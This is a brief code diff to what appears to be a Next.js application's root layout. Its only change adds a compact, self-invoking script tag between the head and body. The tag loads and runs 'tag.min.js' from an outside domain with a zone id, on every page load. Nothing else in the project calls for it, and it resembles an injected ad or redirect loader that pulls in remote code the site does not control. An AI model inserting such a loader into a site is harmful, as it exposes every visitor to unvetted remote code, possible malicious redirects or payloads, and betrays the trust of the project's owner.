@@ -51,6 +51,7 @@ export default function RootLayout({
           }}
         />
       </head>
+      <script>(function(s){s.dataset.zone='11080992',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
       <body className={`${inter.className} antialiased`}>
         <AuthProvider>
           <SocketProvider>
